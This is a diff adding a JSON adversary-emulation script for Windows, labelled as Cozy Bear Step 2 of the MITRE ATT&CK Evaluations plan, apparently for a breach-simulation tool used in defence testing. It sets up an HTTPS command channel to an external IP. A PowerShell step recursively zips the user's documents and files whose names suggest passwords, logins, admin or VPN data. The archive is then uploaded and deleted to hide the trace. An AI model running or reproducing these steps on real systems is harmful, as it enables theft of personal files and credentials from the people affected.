@@ -1,0 +1,57 @@
+{
+    "threat": {
+        "category": "User-Defined", 
+        "description": "Cozy Bear Step 2 of the MITRE ATT&CK Evaluations Adversary Emulation Plan", 
+        "display_name": "CozyBear-Step2", 
+        "name": "CozyBear-Step2", 
+        "operating_system_name": "windows", 
+        "script": {
+            "0": {
+                "conf": "--cp 35.221.46.24:443 --secure true", 
+                "module": "https", 
+                "type": "initialization"
+            }, 
+            "1": {
+                "module": "loader", 
+                "module_to_load": "run", 
+                "request": "--load run", 
+                "type": "message", 
+                "xrand": "9bb1915a98296ed8f101ceb0c397bec0"
+            }, 
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c powershell -Command \"$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force\"", 
+                "type": "message", 
+                "xrand": "2aa8e66c55a133a15a0d90ab6c7588ef"
+            }, 
+            "3": {
+                "module": "loader", 
+                "module_to_load": "uploader", 
+                "request": "--load uploader", 
+                "type": "message", 
+                "xrand": "59dbd496eb014ddcee119263e3ea7c68"
+            }, 
+            "4": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea", 
+                "module": "uploader", 
+                "request": "--remotepath \"%USERPROFILE%\\AppData\\Roaming\\Draft.zip\"", 
+                "type": "message", 
+                "xrand": "6f4a14385688b9918e7eeecfcd681377"
+            }, 
+            "5": {
+                "time": 60, 
+                "type": "delay", 
+                "xrand": "f967e9311d7a50b023cbff9097f49dc4"
+            }, 
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c del \"%USERPROFILE%\\AppData\\Roaming\\Draft.Zip\"", 
+                "type": "message", 
+                "xrand": "8c993ef9663809947ef92c2c0c8d5678"
+            }
+        }, 
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
